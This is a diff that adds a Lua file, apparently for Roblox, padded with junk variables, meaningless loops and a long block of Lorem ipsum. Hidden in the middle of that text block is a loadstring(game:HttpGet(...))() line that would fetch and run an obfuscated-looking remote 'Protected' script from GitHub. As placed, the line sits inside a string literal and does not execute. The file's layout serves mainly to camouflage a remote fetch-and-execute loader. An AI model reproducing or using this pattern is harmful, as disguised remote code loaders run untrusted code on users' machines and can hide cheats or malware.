@@ -1,0 +1,80 @@
+local junk1 = "asduiqweopznxmvclkjhgftry"
+local junk2 = 876543210
+local function junkFuncA(a,b) return (a*19 + b*23) % 1357911 end
+local function junkFuncB(x) return tostring(x*88888):reverse() end
+
+local textBlock = [[
+Lorem ipsum dolor sit amet consectetur adipiscing elit donec fermentum lectus ut magna congue luctus integer laoreet viverra mi 
+non dignissim felis suscipit pellentesque non magna at turpis tempor bibendum maecenas vulputate urna eu erat ultricies in ultricies 
+sapien accumsan cras vehicula nunc ac feugiat vehicula justo neque viverra dolor nec posuere metus sem ut diam in eget dui elementum 
+aliquet nulla in lorem imperdiet volutpat suspendisse in felis a metus congue euismod ut in felis id mi pulvinar imperdiet nec nec 
+sapien fusce a metus dictum magna interdum feugiat aenean ullamcorper justo et ligula cursus dignissim fusce et ligula urna in varius 
+massa nulla id lectus hendrerit fringilla vestibulum in odio ultricies scelerisque massa sed sodales mi nec tortor volutpat posuere in 
+placerat orci vitae sem blandit porttitor sed condimentum purus sit amet sapien sagittis feugiat morbi hendrerit erat ac luctus dictum 
+nulla sapien posuere nulla vitae posuere sem ligula ut ipsum nunc eu lectus finibus elementum vitae a ipsum nulla scelerisque felis et 
+feugiat turpis nisi eget orci nullam eu lectus nec nisi posuere interdum donec ac leo porta ligula volutpat tempor vitae vestibulum erat 
+Integer sit amet dui et ligula sollicitudin ultrices donec feugiat risus at felis blandit ac sagittis est dapibus sed luctus magna vel 
+turpis scelerisque id gravida nunc lacinia cras convallis turpis quis nisl commodo aliquet aliquam erat volutpat morbi feugiat erat et 
+nisi tristique at tincidunt mauris mattis nunc maecenas feugiat magna ut lacus condimentum bibendum etiam mattis erat nec lectus posuere 
+nec cursus sapien blandit donec eu orci eros vivamus ornare leo et diam laoreet gravida et sit amet felis morbi venenatis nulla erat et 
+commodo lectus luctus vitae nam finibus risus vitae nisl maximus nec tincidunt ligula lacinia morbi sed risus a erat facilisis consequat 
+duis non nibh sit amet massa pharetra sagittis id nec diam nulla vestibulum tellus nec purus ultricies tristique et sed magna morbi sed 
+eros fermentum laoreet mauris at convallis nulla in egestas metus vel lorem eleifend rhoncus in ac nisl ac magna tristique tristique nec 
+eu diam phasellus porttitor lorem nec lectus consequat nec elementum nulla imperdiet phasellus sagittis sapien ac lorem finibus tincidunt 
+mauris felis sagittis lacus ac vulputate sapien tortor et metus etiam id felis fermentum eros consectetur volutpat donec porta metus vel 
+lectus commodo posuere et sed arcu quis turpis lacinia sodales integer sagittis nisl nec purus varius ac varius purus dictum etiam id 
+sapien ac leo maximus porta morbi fermentum libero ac lectus dictum accumsan nam sit amet massa eget sapien volutpat aliquet quisque et 
+mauris varius porta augue eu gravida turpis phasellus porta dolor in metus facilisis sit amet vehicula nisi convallis in at euismod lacus 
+vel neque eleifend viverra vestibulum risus orci cursus sem eget convallis urna nisi a erat donec tincidunt leo ut libero dictum feugiat 
+morbi porttitor eros ut elit laoreet suscipit in eu sem eget leo dictum sodales quis vitae nisi nunc nec eros vel lectus consequat gravida 
+at a odio ut nibh porttitor feugiat donec nec sapien sit amet nulla blandit venenatis et eu orci nunc nec leo a turpis tincidunt malesuada 
+nunc ullamcorper leo eget lectus suscipit finibus nec a nulla nunc vestibulum nulla sed purus bibendum cursus quisque ultricies sapien in 
+urna gravida condimentum quam at blandit libero malesuada nec proin mattis lacus sit amet nulla malesuada nec mattis elit pretium aenean 
+aliquam purus quis orci ultricies fermentum et nec mauris fusce viverra turpis at eros suscipit volutpat et sit amet massa mauris nec 
+urna vulputate commodo et sed nisl sed sapien vulputate tristique nunc ut dui sodales feugiat nec nec nisi aliquam at neque quis justo 
+varius congue nec sed arcu in sapien vestibulum luctus turpis vel venenatis arcu aliquam quis magna a mi commodo gravida sed ac est duis 
+aliquet nulla sit amet dolor sollicitudin ut fermentum augue eleifend sed in felis in mi rutrum egestas sed at lacus vivamus faucibus 
+urna sit amet nisl rhoncus feugiat a mattis nunc consequat donec auctor erat sit amet turpis egestas consequat vel eget massa sed turpis 
+interdum dapibus et sit amet tortor etiam venenatis justo vel nisl dapibus et tempor nulla efficitur phasellus sagittis metus sed est 
+scelerisque sed lacinia augue luctus nulla sit amet eros eget turpis tincidunt porttitor a sed felis morbi ornare tortor non purus commodo 
+pharetra maecenas eu diam et dolor tempor lacinia vitae vel nisl vestibulum suscipit magna sed quam varius malesuada sit amet nec lacus 
+proin elementum mauris eget suscipit varius sed at sapien donec non risus sit amet lorem dapibus pretium et id nisi fusce luctus mauris 
+ut risus volutpat tincidunt nec et nisi nullam sit amet purus sed elit ultricies vestibulum et ac turpis sed sapien blandit viverra non 
+sed purus nam bibendum sapien et dui tincidunt posuere a ut ligula in leo efficitur ullamcorper at vel magna in volutpat libero vitae 
+nisi feugiat ultricies in quis risus feugiat scelerisque mauris vitae lectus congue luctus at vel erat in massa tempor mattis et non 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Enzo868/Mix-Script-/977a110b723579f2417302d2b67f059492db6043/Protected_3867541743504536.lua.txt"))()
+sapien maecenas vel turpis sed neque volutpat lacinia et eu est ut turpis semper bibendum ut eget odio in felis interdum consectetur ut 
+id est vestibulum nunc sed eros rhoncus accumsan a sed eros vivamus egestas orci at leo tempor euismod et ac eros id justo dapibus 
+placerat sed at purus vel tortor tincidunt pretium vitae non nibh in rutrum massa sed tellus tincidunt rutrum nunc et varius tellus 
+suspendisse in metus eu felis accumsan bibendum a ac nulla fusce in eros et sem ultrices condimentum sit amet ut neque morbi ut turpis 
+congue finibus metus id feugiat tellus feugiat nec et massa donec varius purus id urna varius volutpat et ac lectus a metus vehicula 
+tristique sed ut sapien
+morbi at turpis vel eros vehicula suscipit sit amet nec lorem cras in justo laoreet elit congue tincidunt sed at metus ut turpis 
+semper tincidunt nulla ut neque commodo viverra integer eget mi dictum bibendum nec ut turpis sed nisl gravida ultricies non nec magna 
+aliquam sed arcu sed erat feugiat feugiat vel eget orci
+]]
+local junk3 = {true,false,true,false}
+local function junkFuncC(tbl)
+    local sum = 0
+    for i,v in ipairs(tbl) do
+        if v then sum = sum + i*17 else sum = sum - i*9 end
+    end
+    return sum
+end
+for i = 1, 1000 do
+    local t = tostring(i) .. junk1 .. tostring(junk2)
+    local v = junkFuncA(i, junk2)
+    if v % 2 == 0 then
+        junk2 = junk2 + v
+    else
+        junk1 = junkFuncB(v)
+    end
+end
+for i = 1, 1000 do
+    local x = junkFuncC(junk3)
+    if x % 7 == 0 then
+        table.insert(junk3, i % 2 == 0)
+    else
+        table.remove(junk3, 1)
+    end
+end
